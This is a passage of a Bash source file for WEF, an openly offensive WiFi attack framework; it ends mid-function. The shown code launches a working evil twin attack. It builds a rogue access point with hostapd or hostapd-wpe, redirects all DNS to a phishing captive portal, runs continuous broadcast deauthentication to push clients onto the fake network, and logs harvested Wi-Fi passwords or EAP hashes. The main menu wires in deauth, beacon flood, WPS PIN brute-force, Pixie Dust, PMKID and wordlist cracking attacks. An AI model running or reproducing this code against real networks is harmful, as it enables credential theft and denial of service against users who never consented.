          if [ "$lang" == "en" ]; then
            color_output_ln "X" "Invalid option"; sleep 0.1
          else
            color_output_ln "X" "Opción inválida"; sleep 0.1
          fi
        fi
      done
    fi

    # Set root of the web if a custom template was not provided
    if [ ! "${portal_path}" ]; then
      portal_path="/usr/share/wef/main/captive-portals/${country_code}-portal"
      create_template
    fi

    create_lighttpd_conf
  fi

  if [ "$lang" == "en" ]; then
    press_enter "Some windows will open, do not close them. Press [Enter] to continue and launch attack "
  else
    press_enter "Algunas ventanas se abrirán, no las cierres. Presiona [Enter] para continuar y lanzar el ataque "
  fi

  ip link set $evilCard up 2>/dev/null

  sleep 3

  # Creating hostapd configuration file
  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
    echo "interface=${evilCard}
ssid=${essid}
hw_mode=${hw_mode}
channel=${channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wme_enabled=1
driver=nl80211" >> /usr/share/wef/cache/hostapd.conf

  elif [ "$evil_option" == "3" ] || [ "$evil_option" == "4" ]; then
    echo "interface=${evilCard}
ssid=${essid}
channel=${channel}

eap_user_file=/etc/hostapd-wpe/hostapd-wpe.eap_user
ca_cert=/etc/hostapd-wpe/ca.pem
server_cert=/etc/hostapd-wpe/server.pem
private_key=/etc/hostapd-wpe/server.key
private_key_passwd=whatever
dh_file=/etc/hostapd-wpe/dh

eap_server=1
eap_fast_a_id=101112131415161718191a1b1c1d1e1f
eap_fast_a_id_info=hostapd-wpe
eap_fast_prov=3
ieee8021x=1
pac_key_lifetime=604800
pac_key_refresh_time=86400
pac_opaque_encr_key=000102030405060708090a0b0c0d0e0f
wpa=2
wpa_key_mgmt=WPA-EAP
wpa_pairwise=CCMP
rsn_pairwise=CCMP

logger_syslog=-1
logger_syslog_level=2
logger_stdout=-1
logger_stdout_level=2

hw_mode=${hw_mode}
macaddr_acl=0
auth_algs=3
ignore_broadcast_ssid=0" >> /usr/share/wef/cache/hostapd.conf
  fi

  # Launch hostapd
  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
    if [ "${airmon_check_kill}" == "true" ]; then
      # No headless
      if [ "$karma" == "y" ] || [ "$karma" == "yes" ] || [ "$karma" == "s" ] || [ "$karma" == "si" ]; then
        xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe /usr/share/wef/cache/hostapd.conf -k" 2>/dev/null &
      else
        xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Hostapd" -xrm 'XTerm*selectToClipboard: true' -e "hostapd /usr/share/wef/cache/hostapd.conf" 2>/dev/null &
      fi
    else
      # Headless
      if [ "$karma" == "y" ] || [ "$karma" == "yes" ] || [ "$karma" == "s" ] || [ "$karma" == "si" ]; then
        hostapd-wpe /usr/share/wef/cache/hostapd.conf -k &>/dev/null &
      else
        hostapd /usr/share/wef/cache/hostapd.conf &>/dev/null &
      fi
    fi
  elif [ "$evil_option" == "3" ] || [ "$evil_option" == "4" ]; then
    if [ "${airmon_check_kill}" == "true" ]; then
      # No headless
      if [ "$karma" == "y" ] || [ "$karma" == "yes" ] || [ "$karma" == "s" ] || [ "$karma" == "si" ]; then
        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Hostapd-wpe" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe /usr/share/wef/cache/hostapd.conf -s -k" 2>/dev/null &
      else
        xterm -hold -bg "#000000" -fg "#FFFFFF" -geometry 107x36-10+10 -T "Hostapd-wpe" -xrm 'XTerm*selectToClipboard: true' -e "hostapd-wpe /usr/share/wef/cache/hostapd.conf -s" 2>/dev/null &
      fi
    else
      # Headless
      if [ "$karma" == "y" ] || [ "$karma" == "yes" ] || [ "$karma" == "s" ] || [ "$karma" == "si" ]; then
        hostapd-wpe /usr/share/wef/cache/hostapd.conf -s -k &>/dev/null &
      else
        hostapd-wpe /usr/share/wef/cache/hostapd.conf -s &>/dev/null &
      fi
    fi
  fi
  hostapd_PID=$!

  sleep 5

  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
    # Creating dnsmasq configuration file
    echo "
  interface=${evilCard}
  dhcp-range=10.0.221.2,10.0.221.30,255.255.255.0,12h
  dhcp-option=3,10.0.221.1
  dhcp-option=6,10.0.221.1
  server=8.8.8.8
  log-queries
  log-dhcp
  listen-address=10.0.221.1
  address=/#/10.0.221.1" >> /usr/share/wef/cache/dnsmasq.conf

    ip address add 10.0.221.1/24 dev ${evilCard}
    #ifconfig ${evilCard} 10.0.221.1 netmask 255.255.255.0
    route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1

    # Dnsmasq
    if [ "${airmon_check_kill}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Dnsmasq" -xrm 'XTerm*selectToClipboard: true' -e "dnsmasq -C /usr/share/wef/cache/dnsmasq.conf -d" 2>/dev/null &
    else
      dnsmasq -C /usr/share/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &
    fi
    dnsmasq_PID=$!

    sleep 5
  fi

  # Deauth
  if [ "$evil_option" == "2" ] || [ "$evil_option" == "4" ]; then
    iw dev mon${netCard} set channel ${channel} 2>/dev/null
    sleep 0.1

    if [ "${airmon_check_kill}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Deauth" -xrm 'XTerm*selectToClipboard: true' -e "aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_bssid} mon${evilCard}" 2>/dev/null &
    else
      aireplay-ng -0 0 -c FF:FF:FF:FF:FF:FF --ignore-negative-one -a ${ap_bssid} "mon${evilCard}" > /dev/null 2>&1 &
    fi
    eviltwin_deauth_PID=$!

    sleep 4
  fi

  if [ "$evil_option" == "1" ] || [ "$evil_option" == "2" ]; then
    # Start web server (Lighttpd)
    if [ "${airmon_check_kill}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "Lighttpd" -xrm 'XTerm*selectToClipboard: true' -e "lighttpd -D -f /usr/share/wef/cache/lighttpd.conf" 2>/dev/null &
    else
      lighttpd -f /usr/share/wef/cache/lighttpd.conf > /dev/null 2>&1 &
    fi
    lighttpd_PID=$!

    sleep 4

    export -f check_eviltwin_success # Export function
    if [ "${airmon_check_kill}" == "true" ]; then
      xterm -hold -bg "#000000" -fg "#FFFFFF" -T "EvilTwin" -xrm 'XTerm*selectToClipboard: true' -e "check_eviltwin_success" 2>/dev/null &
      eviltwin_PID=$!
    fi

    if [ "${ap_bssid}" ] && [ "${essid}" ]; then
      ap_dir="${essid}-${ap_bssid}"
    elif [ "${ap_bssid}" ] && [ ! "${essid}" ]; then
      ap_dir="${ap_bssid}"
    fi

    mkdir "/usr/share/wef/main/captures/${ap_dir}/"

    if [ "$lang" == "en" ]; then
      if [ "$check_passwords" == "y" ] || [ "$check_passwords" == "yes" ] || [ "$check_passwords" == "s" ] || [ "$check_passwords" == "si" ]; then
        good_output_ln "+" "Evil Twin attack deployed successfully, when correct password is submitted attack will stop immediately"
      else
        good_output_ln "+" "Evil Twin attack deployed successfully"
      fi

      if [ "$template_type" == "built-in" ] || [ "$template_type" == "builtin" ] || [ "$template_type" == "predefinidas" ] || [ "$template_type" == "default" ] || [ ! "$template_type" ]; then
        check_eviltwin_password & # This will notify the user is the correct password is provided
        color_output "*" "Gathered passwords attempts will be stored in /usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt"
      else
        color_output "*" "As you are using a custom template, make sure to check the obtained data by your own"
      fi
      
      press_enter "Press [Enter] to continue and finish the attack "
    else
      if [ "$check_passwords" == "y" ] || [ "$check_passwords" == "yes" ] || [ "$check_passwords" == "s" ] || [ "$check_passwords" == "si" ]; then
        good_output_ln "+" "Ataque Evil Twin desplegado correctamente, cuando se introduzca la contraseña correcta se detendrá el ataque automaticamente"
      else
        good_output_ln "+" "Ataque Evil Twin desplegado correctamente"
      fi

      if [ "$template_type" == "built-in" ] || [ "$template_type" == "builtin" ] || [ "$template_type" == "predefinidas" ] || [ "$template_type" == "default" ] || [ ! "$template_type" ]; then
        check_eviltwin_password & # This will notify the user is the correct password is provided
        color_output "*" "Las contraseñas recolectadas serán almacenadas en /usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt"
      else
        color_output "*" "Al estar usando una plantilla personalizada, asegurate de comprobar la información obtenida por ti mismo"
      fi

      press_enter "Presiona [Enter] para continuar y terminar el ataque "
    fi

    sleep 0.5
    cp "/tmp/www/attempts.txt" "/usr/share/wef/main/captures/${ap_dir}/eviltwin_attempts.txt" 2>/dev/null

  elif [ "$evil_option" == "3" ] || [ "$evil_option" == "4" ]; then

    if [ "$lang" == "en" ]; then
      color_output_ln "*" "Obtained passwords or hashes will be shown on hostapd output"
      good_output "+" "Evil Twin attack deployed successfully"
      press_enter "Press [Enter] to continue and finish the attack "
    else
      color_output_ln "*" "Las contraseñas o hashes obtenidos se mostrarán en el output de hostapd"
      good_output "+" "Ataque Evil Twin desplegado correctamente"
      press_enter "Presiona [Enter] para continuar y terminar el ataque "
    fi

    mv hostapd-wpe.log /usr/share/wef/cache/hostapd-wpe.log 2>/dev/null
  fi
  

  # Attack finish here, restore interface and return to main menu
  rm -rf "/tmp/www" 2>/dev/null
  evil_twin_c
  killall hostapd hostapd-wpe dnsmasq lighttpd &>/dev/null
  airmon-ng start "${oldCard}" &>/dev/null
}




#
# Main workflow starts here
#

parameters=("$1" "$2" "$3" "$4" "$5" "$6" "$7" "$8" "$9")
export lang="en" # Default language

SHELL="/bin/bash"

config_lang=$(awk -F '=' '/lang/ {print $2}' /usr/share/wef/wef.cnf 2>/dev/null | sed 's/#.*//' | tr -d " ")
if [ "$config_lang" == "en" ]; then
  lang="en"
elif [ "$config_lang" == "es" ]; then
  lang="es"
fi

use_colors=$(awk -F '=' '/use_colors/ {print $2}' /usr/share/wef/wef.cnf 2>/dev/null | sed 's/#.*//' | tr -d " ")
if [ "$use_colors" == "true" ] || [ ! -d "/usr/share/wef" ]; then
  # Define colors and formats
  export greenC="\e[0;32m\033[1m"
  export endC="\033[0m\e[0m"
  export blueC="\e[0;34m\033[1m"
  export yC="\e[0;33m\033[1m"
  export grayC="\e[0;37m\033[1m"
fi

for parameter in ${parameters[@]}; do
  if [ "${parameter}" == "-s" ]; then
    lang="es"
  fi
done

# Main program function
if [ "$(id -u)" == "0" ]; then

  program_version="1.4"

  while getopts ":i:" arg; do
    case ${arg} in
      i) netCard=$OPTARG;
    esac
  done

  for parameter in ${parameters[@]}; do

    if [ "${parameter}" == "--version" ]; then
      if [ "$lang" == "en" ]; then
        echo -e "wef v${program_version} for linux (https://github.com/D3Ext/WEF)"
        echo -e "Created by D3Ext <d3ext@proton.me>"
      else
        echo -e "wef v${program_version} para linux (https://github.com/D3Ext/WEF)"
        echo -e "Creado por D3Ext <d3ext@proton.me>"
      fi
      exit 0
    fi

    if [ "$parameter" == "-h" ] || [ "$parameter" == "--help" ]; then
      help_panel
      exit 0
    fi
  done

  if [ ! -d "/usr/share/wef/main/" ]; then
    run_setup
    exit 0
  fi

  if [ ! -f "/usr/share/wef/wef.cnf" ]; then
    echo "# This is default config file
# This file must be saved as /usr/share/wef/wef.cnf
# Then you can edit it to make it much more flexible and to adapt to your requirements

# Default lenguage to use. Values: en, es
lang=en

# Colorize output (recommended to be enabled)
use_colors=true

# Enable/disable verbose by default (recommended to be enabled)
verbose=true" > /usr/share/wef/wef.cnf
  fi

  if [ "$1" == "--interface" ]; then
    netCard="$2"
  elif [ "$2" == "--interface" ]; then
    netCard="$3"
  elif [ "$3" == "--interface" ]; then
    netCard="$4"
  elif [ "$4" == "--interface" ]; then
    netCard="$5"
  fi

  if [ "$netCard" ]; then
    if [ ! -d "/sys/class/net/${netCard}" ]; then
      echo -e "${yC} __      _____ ___ "
      echo -e " \ \    / / __| __|"
      echo -e "  \ \/\/ /| _|| _| "
      echo -e "   \_/\_/ |___|_|  ${endC}"
      if [ "$lang" == "en" ]; then
        color_output_ln "X" "Interface not found"
      else
        color_output_ln "X" "Interfaz no disponible"
      fi

      exit 0
    fi

    if [ "$(check_interface_mode)" == "monitor" ]; then
      if [ "$(check_monitor_type)" == "airmon" ]; then
        oldCard=$(echo "${netCard}" | sed 's/mon//g')
        evilCard=${oldCard}
      elif [ "$(check_monitor_type)" == "iw" ]; then
        oldCard=${netCard}
        evilCard=${netCard}
      fi
    fi

    if [ "$lang" == "en" ]; then
      color_output "*" "WEF v${program_version}"
      color_output "*" "Use this tool only under your own responsibility"
      progress_bar 2 0.6 "*" "Starting framework"
    else
      color_output "*" "WEF v${program_version}"
      color_output "*" "Use esta herramienta unicamente bajo su responsabilidad"
      progress_bar 2 0.6 "*" "Iniciando framework"
    fi

    if [ "$(command -v airmon-ng)" ]; then
      delim=$(airmon-ng | grep "${netCard}" | awk '{print $3}')
      chipset="$(airmon-ng | grep "${netCard}" | grep -oP "(?<=${delim}).*" | sed 's/^[[:blank:]]*//')"

      if [ "$(echo "${chipset}" | grep "unknown")" ]; then
        chipset="(unknown)"
      fi
    fi

    parse_config

    # Check if given interface supports monitor mode
    if [ "$(command -v iw)" ] && [ ! "$(iw list | grep "Supported interface modes" -A 8 | grep -i "monitor")" ]; then
      echo
      if [ "$lang" == "en" ]; then
        color_output_no_line "*" "Provided interface does not seem to support monitor mode. Do you want to continue? (${yC}yes${blueC}/${yC}no${blueC}): " && read check_mon
      else
        color_output_no_line "*" "La interfaz proporcionada no parece soportar modo monitor. ¿Quieres continuar? (${yC}si${blueC}/${yC}no${blueC}): " && read check_mon
      fi

      if [ "$check_mon" != "y" ] && [ "$check_mon" != "yes" ] && [ "$check_mon" != "s" ] && [ "$check_mon" != "si" ]; then
        exit 0
      fi
    fi

    # Check compulsory tools
    check_dependencies

    # Check if auto_enable_monitor is set to true
    if [ "${auto_enable_monitor}" == "true" ]; then
      enable_mon
    else
      sleep 1
    fi

    ip link set ${netCard} up 2>/dev/null

    # Define band based on config file
    if [ "${frequency_band}" == "auto" ]; then
      out="$(iw list | grep -A 10 'Frequencies:')"
      if [ "$(echo ${out} | grep "\[6\]")" ] && [ ! "$(echo ${out} | grep "\[36\]")" ]; then
        band="g"
      elif [ "$(echo ${out} | grep "\[6\]")" ] && [ "$(echo ${out} | grep "\[36\]")" ]; then
        band="ag"
      fi

    elif [ "${frequency_band}" == "2.4" ] || [ "${frequency_band}" == "2" ]; then
      band="g"
    elif [ "${frequency_band}" == "5" ]; then
      band="a"
    fi

    clear_p=1 # Define parameter to clear or not the screen
    while true; do
      trap keep_exit_c INT
      input=1

      # Use a counter to not to print the banner and the panel all the times
      if [ $clear_p == 1 ]; then
        clear
        clear_p=0

        banner
        dir=$(pwd)
        print_interface_name; print_interface_mode; print_mac_address

        attacks_panel
        if [ "$lang" == "en" ]; then
          echo -e "\n${blueC}Type ${yC}help${blueC} to display more functions and commands${endC}"
        else
          echo -e "\n${blueC}Escribe ${yC}help${blueC} para ver mas funciones y comandos${endC}"
        fi
      fi

      echo -ne "\n${blueC}[${yC}WEF${blueC}] >>${endC} " && read option
      input=0

      if [ "$option" == "1" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="Deauthentication Attack"
        else
          type_of_attack="Ataque de Deautenticación"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          deauthentication_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "2" ] || [ "$option" == "wids" ] || [ "$option" == "confusion" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="WIDS Confusion Attack"
        else
          type_of_attack="Ataque de Confusión WIDS"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          wids_confusion_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="Authentication Attack"
        else
          type_of_attack="Ataque de Autenticación"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          authentication_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "4" ] || [ "$option" == "beacon" ] || [ "$option" == "beacon flood" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="Beacon Flood Attack"
        else
          type_of_attack="Ataque Beacon Flood"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          beacon_flood_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "5" ] || [ "$option" == "michael" ] || [ "$option" == "tkip" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="Michael Shutdown Exploitation Attack (TKIP)"
        else
          type_of_attack="Ataque Michael Shutdown Exploitation (TKIP)"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          tkip_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "6" ] || [ "$option" == "pixiedust" ] || [ "$option" == "pixie" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="Pixie Dust Attack"
        else
          type_of_attack="Ataque Pixie Dust"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          echo
          wps_tools_missing="false"
          if [ ! "$(command -v reaver)" ]; then
            log_command_not_found "reaver"
            wps_tools_missing="true"
          fi

          if [ ! "$(command -v wash)" ]; then
            log_command_not_found "wash"
            wps_tools_missing="true"
          fi

          if [ "$wps_tools_missing" == "true" ]; then
            continue
          fi

          pixie_dust_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "7" ] || [ "$option" == "brute" ]; then
        if [ "$lang" = "en" ]; then
          type_of_attack="PIN Bruteforce Attack"
        else
          type_of_attack="Ataque de fuerza bruta de PIN"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          echo
          wps_tools_missing="false"
          if [ ! "$(command -v reaver)" ]; then
            log_command_not_found "reaver"
            wps_tools_missing="true"
          fi

          if [ ! "$(command -v wash)" ]; then
            log_command_not_found "wash"
            wps_tools_missing="true"
          fi

          if [ "$wps_tools_missing" == "true" ]; then
            continue
          fi

          pin_bruteforce_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "8" ] || [ "$option" == "null" ] || [ "$option" == "nullpin" ]; then
        if [ "$lang" = "en" ]; then
          type_of_attack="Null Pin Attack"
        else
          type_of_attack="Ataque de Pin nulo"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          echo
          wps_tools_missing="false"
          if [ ! "$(command -v reaver)" ]; then
            log_command_not_found "reaver"
            wps_tools_missing="true"
          fi

          if [ ! "$(command -v wash)" ]; then
            log_command_not_found "wash"
            wps_tools_missing="true"
          fi

          if [ "$wps_tools_missing" == "true" ]; then
            continue
          fi

          null_pin_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "9" ] || [ "$option" == "replay" ] || [ "$option" == "arp" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="ARP Replay Attack"
        else
          type_of_attack="Ataque ARP Replay"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          arp_replay_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "10" ] || [ "$option" == "hirte" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="HIRTE Attack"
        else
          type_of_attack="Ataque HIRTE"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          hirte_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "11" ] || [ "$option" == "caffelatte" ] || [ "$option" == "caffe latte" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="Caffe Latte Attack"
        else
          type_of_attack="Ataque Caffe Latte"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          caffe_latte_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "12" ] || [ "$option" == "fake" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="Fake Authentication Attack"
        else
          type_of_attack="Ataque de falsa autenticación"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          fake_authentication_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "13" ] || [ "$option" == "passive" ] || [ "$option" == "wpa" ] || [ "$option" == "handshake" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="WPA/2 handshake capture attack"
        else
          type_of_attack="Ataque de captura de handshake WPA/2"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          passive_capture_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "14" ] || [ "$option" == "pmkid" ]; then
        if [ "$lang" == "en" ]; then
          type_of_attack="PMKID Attack"
        else
          type_of_attack="Ataque PMKID"
        fi

        if [ "$(check_interface_mode)" == "monitor" ]; then
          echo
          hcx_tools_missing="false"
          if [ ! "$(command -v hcxdumptool)" ]; then
            log_command_not_found "hcxdumptool"
            hcx_tools_missing="true"
          fi

          if [ ! "$(command -v hcxpcapngtool)" ]; then
            log_command_not_found "hcxpcapngtool"
            hcx_tools_missing="true"
          fi

          if [ ! "$(command -v hcxhashtool)" ]; then
            log_command_not_found "hcxhashtool"
            hcx_tools_missing="true"
          fi

          if [ "$hcx_tools_missing" == "true" ]; then
            continue
          fi

          pmkid_attack; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "15" ] || [ "$option" == "pwnagotchi" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          echo
          pwnagotchi_tools_missing="false"

          if [ ! "$(command -v hcxpcapngtool)" ]; then
            log_command_not_found "hcxpcapngtool"
            pwnagotchi_tools_missing="true"
          fi

          if [ ! "$(command -v bettercap)" ]; then
            log_command_not_found "bettercap"
            pwnagotchi_tools_missing="true"
          fi

          if [ "$pwnagotchi_tools_missing" == "true" ]; then
            continue
          fi

          pwnagotchi; clear_p=1
        else
          log_monitor_is_disabled
        fi


      elif [ "$option" == "16" ] || [ "$option" == "evil" ] || [ "$option" == "eviltwin" ] || [ "$option" == "e" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          echo
          et_tools_missing="false"
          if [ ! "$(command -v hostapd)" ]; then
            log_command_not_found "hostapd"
            et_tools_missing="true"
          fi

          if [ ! "$(command -v hostapd-wpe)" ]; then
            log_command_not_found "hostapd-wpe"
            et_tools_missing="true"
          fi

          if [ ! "$(command -v dnsmasq)" ]; then
            log_command_not_found "dnsmasq"
            et_tools_missing="true"
          fi

          if [ ! "$(command -v lighttpd)" ]; then
            log_command_not_found "lighttpd"
            et_tools_missing="true"
          fi

          if [ "$et_tools_missing" == "true" ]; then
            continue
          fi

          evil_twin; clear_p=1
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "enable" ] || [ "$option" == "start" ] || [ "$option" == "monitor" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          if [ "$lang" == "en" ]; then
            echo -e "\n${yC}Interface already in monitor mode${endC}"
          else
            echo -e "\n${yC}La interfaz ya está en modo monitor${endC}"
          fi

        else
          enable_mon; clear_p=1
        fi

      elif [ "$option" == "disable" ] || [ "$option" == "stop" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          disable_mon
          if [ "$lang" == "en" ]; then
            press_enter "Monitor mode disabled, press [Enter] to continue "
          else
            press_enter "Modo monitor desactivado, presiona [Enter] para continuar "
          fi
          clear_p=1

        else
          if [ "$lang" == "en" ]; then
            echo -e "\n${yC}Interface already in managed mode${endC}"
          else
            echo -e "\n${yC}La interfaz ya está en modo managed${endC}"
          fi
        fi

      elif [ "$option" == "mac" ] || [ "$option" == "random" ] || [ "$option" == "randomize" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          randomize_mac
          mac_randomized="true"
          changed_mac=$(macchanger -s ${netCard} | grep "Curren" | awk '{print $3}') # Get new MAC address
          vendor="($(macchanger -s ${netCard} | grep "Curren" | awk '{print $2}' FS="(")" # Get vendor from "macchanger" output
          if [ "$lang" == "en" ]; then
            echo -e "${blueC}[${yC}*${blueC}] New MAC: ${greenC}${changed_mac} ${blueC}${vendor}${endC}"
          else
            echo -e "${blueC}[${yC}*${blueC}] Nueva dirección MAC: ${greenC}${changed_mac} ${blueC}(${vendor}${endC}"
          fi
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "check_vif" ]; then
        if [ "$(check_vif)" ]; then
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "${netCard} seems to support VIF"
          else
            color_output_ln "*" "${netCard} parece soportar VIF"
          fi
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "${netCard} does not seems to support VIF"
          else
            color_output_ln "*" "${netCard} no parece soportar VIF"
          fi
        fi

      elif [ "$option" == "scan" ]; then
        if [ "$(check_interface_mode)" == "monitor" ]; then
          scan_aps
        else
          log_monitor_is_disabled
        fi

      elif [ "$option" == "list" ] || [ "$option" == "list_aps" ]; then
        if [ -f "/usr/share/wef/cache/airodump-01.csv" ]; then
          echo
          format_csv_info
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "No available APs scan found. Execute ${yC}scan${blueC} to scan APs"
          else
            color_output_ln "*" "Ningún escaneo de APs disponible. Ejecuta ${yC}scan${blueC} para escanear APs"
          fi
        fi

      elif [ "$(echo ${option} | awk '{print $1}')" == "inhibit" ]; then
        if [ ! "$(echo ${option} | awk '{print $2}')" ]; then # Check is user has provided a BSSID
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Please especify the BSSID and channel of a valid AP to inhibit its connections"
            color_output "*" "Usage example: inhibit 84:AA:9C:FB:3C:DC 11"
          else
            color_output_ln "*" "Proporciona la BSSID y el canal de un AP válido para inhibir sus conexiones"
            color_output "*" "Ejemplo de uso: inhibit 84:AA:9C:FB:3C:DC 11"
          fi
        elif [ "$(check_interface_mode)" == "monitor" ]; then
          ap_bssid="$(echo ${option} | awk '{print $2}')"
          channel="$(echo ${option} | awk '{print $3}')"
          echo
          inhibitor
        else
          log_monitor_is_disabled
        fi

      elif [ "$(echo $option | awk '{print $1}')" == "graph" ]; then
        csv_file=$(echo $option | awk '{print $2}')
        output_file=$(echo $option | awk '{print $3}')

        if [ "$csv_file" ] && [ -f "${csv_file}" ]; then
          create_graph "${csv_file}" "${output_file}"
        elif [ "$csv_file" ] && [ ! -f "${csv_file}" ]; then
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Especified csv file does not exist"
          else
            color_output_ln "*" "Archivo csv especificado no existe"
          fi
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Usage example: graph capture.csv graph.png"
          else
            color_output_ln "*" "Ejemplo de uso: graph captura.csv gráfico.png"
          fi
        fi

      elif [ "$(echo $option | awk '{print $1}')" == "check" ]; then
        capture_file=$(echo $option | awk '{print $2}')

        if [ ! "$capture_file" ]; then
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Usage example: check /path/to/capture.cap"
          else
            color_output_ln "*" "Ejemplo de uso: check /ruta/de/la/captura.cap"
          fi
        elif [ -f "${capture_file}" ]; then
          print_available_handshakes "${capture_file}"
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "X" "Especified file does not exist!"
          else
            color_output_ln "X" "El archivo especificado no existe!"
          fi
        fi

      elif [ "$(echo $option | awk '{print $1}')" == "crack" ]; then
        capture_file="$(echo "$option" | awk '{print $2}')"
        wordlist_to_use="$(echo "$option" | awk '{print $3}')"

        if [ "$capture_file" ] && [ "$wordlist_to_use" ]; then
          if [ "$wordlist_to_use" == "rockyou" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"
          elif [ "$wordlist_to_use" == "darkweb2017-top10000" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/darkweb2017-top10000.txt"
          elif [ "$wordlist_to_use" == "probable-v2-wpa-top4800" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt"
          fi

          crack_handshake_aircrack "${capture_file}"
        else
          if [ "$lang" == "en" ]; then
            color_output_ln "*" "Usage example: crack /path/to/capture.cap /path/to/wordlist.txt"
            color_output "*" "Preinstalled wordlists are available as argument: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800"
          else
            color_output_ln "*" "Ejemplo de uso: crack /ruta/de/la/captura.cap /ruta/del/diccionario.txt"
            color_output "*" "Los diccionarios preinstalados estan disponibles como argumentos: rockyou, darkweb2017-top10000, probable-v2-wpa-top4800"
          fi
        fi

      elif [ "$(echo $option | awk '{print $1}')" == "john" ]; then

        if [ ! "$(command -v john)" ] || [ ! "$(command -v wpapcap2john)" ]; then
          echo
        fi

        john_tools_missing="false"
        if [ ! "$(command -v john)" ]; then
          log_command_not_found "john"
          john_tools_missing="true"
        fi

        if [ ! "$(command -v wpapcap2john)" ]; then
          log_command_not_found "wpapcap2john"
          john_tools_missing="true"
        fi

        if [ "${john_tools_missing}" == "true" ]; then
          continue
        fi

        capture_file="$(echo "$option" | awk '{print $2}')"
        wordlist_to_use="$(echo "$option" | awk '{print $3}')"

        if [ "$capture_file" ] && [ "$wordlist_to_use" ]; then
          if [ "$wordlist_to_use" == "rockyou" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/rockyou.txt"
          elif [ "$wordlist_to_use" == "darkweb2017-top10000" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/darkweb2017-top10000.txt"
          elif [ "$wordlist_to_use" == "probable-v2-wpa-top4800" ]; then
            wordlist_to_use="/usr/share/wef/main/wordlists/probable-v2-wpa-top4800.txt"
          fi

          crack_handshake_john "${capture_file}"
        else
          if [ "$lang" == "en" ]; then
